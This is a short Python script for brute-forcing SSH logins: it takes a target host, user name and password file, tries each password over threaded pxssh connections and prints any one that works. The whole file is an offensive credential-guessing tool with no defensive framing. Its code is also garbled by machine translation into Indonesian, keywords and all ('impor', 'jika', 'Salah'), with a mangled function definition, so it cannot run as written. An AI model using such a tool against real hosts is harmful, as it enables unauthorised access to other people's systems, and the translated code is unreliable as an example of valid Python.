# ! / usr / bin / env python
# encoding: utf-8
# penulis: wongNdeso_godeyes
# waktu: 2016/11/7 14:48

impor optparse
dari Pexpect impor pxssh
waktu impor
impor penguliran

maxConnections =  5
connection_lock = threading.BoundedSemaphore ( value = maxConnections)
Ditemukan =  Salah
Gagal =  0
def  connect ( host , pengguna , kata sandi , rilis ):
    global Ditemukan, Gagal
    coba :
        s = pxssh.pxssh ()
        s.login (host, pengguna, kata sandi)
        print ( ' [+] Good, Key Found: '  + kata sandi)
        Ditemukan =  Benar
    kecuali  Exception  sebagai e:
        jika  ' read_nonblocking '  di  str (e):
            Gagal + =  1
            time.sleep ( 5 )
            terhubung (host, pengguna, kata sandi, Salah )
        elif  ' sinkronkan dengan prompt asli '  di  str (e):
            time.sleep ( 1 )
            terhubung (host, pengguna, kata sandi, Salah )
    akhirnya :
        jika rilis:
            connection_lock.release ()


 lari def ():
    parser = optparse.OptionParser ( ' usage: ' + ' -H <target host> -u <user> -f <daftar kata sandi> ' )
    parser.add_option ( ' -H ' , dest = ' tgtHost ' , ketik = ' string ' , help = ' tentukan host target ' )
    parser.add_option ( ' -f ' , dest = ' passwdFile ' , ketik = ' string ' , help = ' tentukan file kata sandi ' )
    parser.add_option ( ' -u ' , dest = ' user ' , type = ' string ' , help = ' tentukan pengguna ' )
    parser.add_option ( ' -c ' , dest = ' count ' , type = ' int ' , help = ' tentukan jumlah koneksi max ssh, default 5 ' , default = 5 )
    (opsi, args) = parser.parse_args ()
    connection_lock global
    connection_lock = threading.BoundedSemaphore (options.count)
    host = options.tgtHost
    passwdFile = options.passwdFile
    pengguna = options.user
    jika host ==  Tidak ada  atau passwdFile ==  Tidak ada  atau pengguna == Tidak ada :
        print (parser.usage)
        keluar ( 0 )
    dengan  open (passwdFile, ' r ' ) sebagai fp:
        untuk item dalam fp.readlines ():
            jika ditemukan:
                cetak  " [*] Keluar: Kunci Ditemukan "
                keluar ( 0 )
            jika Gagal >  5 :
                print  " [!] Keluar: Terlalu Banyak Socket Timeout "
                keluar ( 0 )
            connection_lock.acquire ()
            password = item.strip ( ' \ r ' ) .strip ( ' \ n ' )
            print ( " [-] Testing: "  +  str (kata sandi))
            t = threading.Thread ( target = connect, args = (host, pengguna, kata sandi, True ))
            t.start ()

jika  __name__  ==  ' __main__ ' :
    menjalankan()
